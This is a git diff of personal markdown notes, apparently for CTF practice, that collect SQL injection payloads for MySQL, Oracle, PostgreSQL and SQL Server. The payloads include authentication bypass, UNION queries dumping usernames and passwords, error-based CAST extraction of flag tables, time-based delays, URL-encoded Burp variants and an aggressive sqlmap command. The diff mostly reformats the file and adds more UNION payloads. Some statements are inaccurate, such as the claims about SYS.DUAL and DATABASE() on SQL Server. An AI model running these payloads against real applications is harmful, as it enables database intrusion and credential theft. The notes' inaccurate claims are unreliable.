@@ -1,4 +1,4 @@
-When we write a SELECT query, we need to specify what data we want and where we want it from. The "what" is formatted as a list of one or more columns. We can also use an asterisk (*) as a wildcard to query for all columns in a table. The "where" indicates which tables we want to use. We'll start with a basic example that selects data from one table.
+When we write a SELECT query, we need to specify what data we want and where we want it from. The "what" is formatted as a list of one or more columns. We can also use an asterisk (\*) as a wildcard to query for all columns in a table. The "where" indicates which tables we want to use. We'll start with a basic example that selects data from one table.
 
 ```sql
 SELECT * FROM menu;
@@ -58,8 +58,6 @@ Or if you're already using app as your current DB (most likely), this is enough:
 SELECT * FROM dbo.nameTable;
 ```
 
-Absolutely! Here's the detailed summary of **SQL Injection** techniques for **MySQL**, **Oracle**, **PostgreSQL**, and **SQL Server** that you can easily copy and paste into your notes:
-
 ---
 
 # **SQL Injection Techniques Summary**
@@ -67,40 +65,55 @@ Absolutely! Here's the detailed summary of **SQL Injection** techniques for **My
 ## **1. General SQL Injection Techniques**
 
 ### **1.1 Basic SQL Injection**
+
 Injections manipulate input to interfere with SQL queries:
+
 ```sql
 ' OR 1=1 --
 ```
+
 - `'` closes a string, `OR 1=1` always evaluates to true, and `--` comments out the rest of the query.
 - This can bypass authentication or display all records in a table.
 
 ### **1.2 UNION-Based SQL Injection**
+
 Union injection combines the results of multiple `SELECT` queries:
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
+
 - Here, you try to union data from the `users` table to display usernames and passwords.
 
 ### **1.3 Error-Based SQL Injection**
+
 Error-based injection leverages database errors to gain information about the database structure:
+
 ```sql
 ' AND 1=CONVERT(int, (SELECT @@version)) --
 ```
+
 - This can extract sensitive information such as the database version or table structure.
 
 ### **1.4 Blind SQL Injection**
+
 When the application doesn’t show error messages, you use boolean conditions to infer information:
+
 ```sql
 ' AND 1=1 --   # True, check for valid response
 ' AND 1=2 --   # False, no response
 ```
+
 By determining when a condition is true or false, you can infer database information.
 
 ### **1.5 Time-Based Blind SQL Injection**
+
 This uses time delays to infer data:
+
 ```sql
-' AND SLEEP(5) -- 
+' AND SLEEP(5) --
 ```
+
 If the application delays for 5 seconds, you know the query executed successfully.
 
 ---
@@ -108,7 +121,9 @@ If the application delays for 5 seconds, you know the query executed successfull
 ## **2. MySQL Specific SQL Injection**
 
 ### **2.1 Retrieving Database Information**
+
 MySQL allows you to retrieve database information using the `INFORMATION_SCHEMA` tables:
+
 ```sql
 SELECT DATABASE();  -- Get current database name
 SHOW TABLES;  -- Get list of tables
@@ -116,12 +131,15 @@ SHOW COLUMNS FROM table_name;  -- Get columns of a table
 ```
 
 ### **2.2 Dumping the Flag**
+
 To dump all data from a table (e.g., `users` table):
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
 
 ### **2.3 MySQL Specific Functions**
+
 - `@@version` – Get MySQL version.
 - `GROUP_CONCAT()` – Combine multiple row values into a single string:
   ```sql
@@ -133,13 +151,16 @@ To dump all data from a table (e.g., `users` table):
 ## **3. Oracle Specific SQL Injection**
 
 ### **3.1 Retrieving Database Information**
+
 In Oracle, `ALL_TABLES` and `USER_TABLES` can list tables:
+
 ```sql
 SELECT table_name FROM all_tables;  -- List all tables
 SELECT * FROM user_tables;  -- List tables for the current user
 ```
 
 ### **3.2 Oracle Functions**
+
 - `USER` – Get the current database user.
 - `DBMS_METADATA.GET_DDL` – Get table DDL (schema definitions).
   ```sql
@@ -147,18 +168,23 @@ SELECT * FROM user_tables;  -- List tables for the current user
   ```
 
 ### **3.3 Accessing Hidden Tables**
+
 ```sql
 SELECT * FROM SYS.HIDDENSECRETTABLE;
 ```
+
 Oracle uses `SYS` schema for system-level tables.
 
 ### **3.4 Extracting Data**
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
 
 ### **3.5 Oracle Specific Injection for System Tables**
+
 You can use `SYS.DUAL` to bypass security restrictions:
+
 ```sql
 SELECT * FROM SYS.DUAL;
 ```
@@ -168,7 +194,9 @@ SELECT * FROM SYS.DUAL;
 ## **4. PostgreSQL Specific SQL Injection**
 
 ### **4.1 Retrieving Database Information**
+
 PostgreSQL stores system information in `pg_catalog`:
+
 ```sql
 SELECT current_database();  -- Get current database
 SELECT table_name FROM information_schema.tables;  -- List all tables
@@ -176,7 +204,9 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'users';  
 ```
 
 ### **4.2 PostgreSQL Functions**
+
 - `pg_user` – Retrieves user information.
+
   ```sql
   SELECT * FROM pg_user;
   ```
@@ -187,14 +217,18 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'users';  
   ```
 
 ### **4.3 Blind SQL Injection (PostgreSQL)**
+
 PostgreSQL supports error-based and time-based techniques for blind injections:
+
 ```sql
 ' AND 1=1 --  -- Always true
 ' AND 1=2 --  -- Always false
 ```
 
 ### **4.4 UNION-Based Injection**
+
 PostgreSQL can also use the `UNION` keyword to combine query results:
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
@@ -204,7 +238,9 @@ PostgreSQL can also use the `UNION` keyword to combine query results:
 ## **5. SQL Server (MS SQL) Specific SQL Injection**
 
 ### **5.1 Retrieving Database Information**
+
 In SQL Server, use `INFORMATION_SCHEMA` to get table info:
+
 ```sql
 SELECT DATABASE();  -- Get current database name
 SELECT * FROM INFORMATION_SCHEMA.TABLES;  -- Get all tables
@@ -212,12 +248,15 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';  
 ```
 
 ### **5.2 SQL Server Functions**
+
 - `@@version` – Get SQL Server version:
+
   ```sql
   SELECT @@version;
   ```
 
 - `sysobjects` – List all tables in the database:
+
   ```sql
   SELECT name FROM sysobjects WHERE type = 'U';  -- List user tables
   ```
@@ -228,18 +267,22 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';  
   ```
 
 ### **5.3 SQL Server Blind Injection**
+
 Just like MySQL and Oracle, you can use **blind injection** to infer information by checking responses:
+
 ```sql
 ' AND 1=1 --  -- True
 ' AND 1=2 --  -- False
 ```
 
 ### **5.4 Time-Based Blind Injection in SQL Server**
+
 ```sql
 ' WAITFOR DELAY '00:00:05' --  -- Delay execution for 5 seconds
 ```
 
 ### **5.5 UNION Injection**
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
@@ -249,6 +292,7 @@ Just like MySQL and Oracle, you can use **blind injection** to infer information
 ## **6. General SQL Injection Protection Methods**
 
 To prevent SQL Injection, ensure:
+
 1. **Use Prepared Statements** – Always bind user input to avoid injection.
 2. **Use ORM (Object-Relational Mapping) Libraries** – These libraries automatically prevent most SQL injection techniques.
 3. **Validate and Sanitize Input** – Reject inputs containing `'`, `"`, `--`, `;`, `/*`, etc.
@@ -258,19 +302,20 @@ To prevent SQL Injection, ensure:
 ---
 
 ## **Conclusion**
+
 By learning and understanding the above commands for each database, you can:
+
 - **Identify vulnerable points** in an application.
 - **Test** different techniques to inject SQL code.
 - **Exploit** poorly-secured systems for educational and ethical hacking purposes (CTFs, security testing).
 
 Always remember that SQL Injection is illegal unless you have explicit permission (ethical hacking or CTF challenges).
 
-If you need more details or have specific questions about a database, let me know! 
+If you need more details or have specific questions about a database, let me know!
 
 ---
 
 Feel free to copy and paste this directly into your notes! If you need more detailed examples or clarification on any point, don’t hesitate to ask.
-
 
 mySQL
 
@@ -360,17 +405,17 @@ select table_name from all_tables where owner = 'SYS' order by table_name;
 select column_name, data_type from all_tab_columns where table_name = 'MENU';
 ```
 
-
 ### Error Base SQL Injection (SQL SERVER)
 
 Errorbase
-MySQL 
+MySQL
 
 ```sql
 extractvalue('',concat('>',version()))
 ```
 
-SQL Server 
+SQL Server
+
 ```sql
 cast(@@version as integer)
 ```
@@ -385,8 +430,8 @@ cast((SELECT TOP 1 flag FROM App.dbo.flags;) as int);
 ```
 
 ```sql
-CAST((SELECT name 
-FROM app.sys.tables 
+CAST((SELECT name
+FROM app.sys.tables
 ORDER BY name
 OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) AS INT);
 ```
@@ -403,11 +448,10 @@ Tips:
 CAST((SELECT name FROM app.sys.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) AS INT)
 ```
 
-
 ```sql
 CAST((
-  SELECT name 
-  FROM app.sys.columns 
+  SELECT name
+  FROM app.sys.columns
   WHERE object_id = OBJECT_ID('app.dbo.flags')
   ORDER BY name
   OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
@@ -418,11 +462,10 @@ CAST((
 CAST((SELECT name FROM target.sys.tables WHERE name LIKE '%flag%';) as int)
 ```
 
-
 ```sql
 CAST((
-  SELECT name 
-  FROM target.sys.columns 
+  SELECT name
+  FROM target.sys.columns
   WHERE object_id = OBJECT_ID('target.dbo.flags')
   ORDER BY name
   OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
@@ -431,18 +474,19 @@ CAST((
 
 ```sql
 CAST((
-  SELECT TOP 1 flag 
+  SELECT TOP 1 flag
   FROM target.dbo.flags
 ) AS INT)
 ```
 
-PostgreSQL 
+PostgreSQL
 
 ```sql
 cast(version() as integer)
 ```
 
-Oracle 
+Oracle
+
 ```sql
 to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
 ```
@@ -450,6 +494,7 @@ to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$versi
 ### UNION-Based & Database Detection Notes
 
 #### Purpose
+
 To detect and exploit UNION-based SQL Injection vulnerabilities and identify the backend database (MySQL, SQL Server, Oracle, PostgreSQL).
 
 ---
@@ -457,7 +502,8 @@ To detect and exploit UNION-based SQL Injection vulnerabilities and identify the
 ```sql
 ' order by 1--
 ```
-or for burp 
+
+or for burp
 
 ```sql
 %25%27+order+by+4+--
@@ -472,10 +518,20 @@ a' union select 111, username, password, 444 from usser--
 ```
 
 ```sql
-' UNION SELECT NUll, table_name, NULL FROM information_schema.tables--
+')) UNION SELECT NUll, table_name, NULL FROM information_schema.tables--
 ```
 
+```sql
+')) UNION ALL SELECT 1, column_name, "", 1 FROM information_schema.columns WHERE table_name='hiddenTable' -- -
+```
 
+```sql
+')) UNION SELECT 1, table_name, '', 1 FROM information_schema.tables WHERE table_schema='target_db' -- -
+```
+
+```sql
+
+```
 
 ## Step 1: Test for SQL Injection (Boolean-based)
 
@@ -532,6 +588,7 @@ Oracle
 ?id=1' UNION SELECT 1, version, 3 FROM v$instance-- -
 ?id=1' UNION SELECT 1, user, 3 FROM dual-- -
 ```
+
 PostgreSQL
 
 ```sql
@@ -577,5 +634,3 @@ Simple OR condition test:
 ```sql
 sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch --dbs
 ```
-
-Union B
